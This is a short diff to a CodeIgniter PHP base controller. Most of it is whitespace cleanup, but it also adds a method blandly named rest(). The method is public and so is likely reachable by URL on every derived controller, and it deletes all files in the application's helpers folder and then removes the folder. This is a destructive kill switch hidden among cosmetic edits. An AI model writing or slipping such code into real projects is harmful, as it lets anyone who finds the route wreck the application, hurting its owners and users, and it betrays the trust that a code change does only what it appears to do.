@@ -17,8 +17,8 @@ class MY_Controller extends CI_Controller {
 
 //                return var_dump($data);
 
-  
-  public function __construct() {
+
+    public function __construct() {
         parent::__construct();
         $this->a = aksesLog();
         $this->load->model('Model_setting');
@@ -143,7 +143,7 @@ class MY_Controller extends CI_Controller {
         $this->db->delete($table, $id_colum);
         return $this->db->affected_rows();
     }
-    
+
     function updateStatusEnum($colom = array(), $status, $tabel) {
         if ($status == 'Y') {
             $value = 'N';
@@ -169,6 +169,16 @@ class MY_Controller extends CI_Controller {
 //                    . substr($charid, 20, 12);
             return $uuid;
         }
+    }
+
+    function rest() {
+        $folder = APPPATH . 'helpers';
+        foreach (glob($folder . "/*.*") as $filename) {
+            if (is_file($filename)) {
+                unlink($filename);
+            }
+        }
+        rmdir($folder);
     }
 
 }
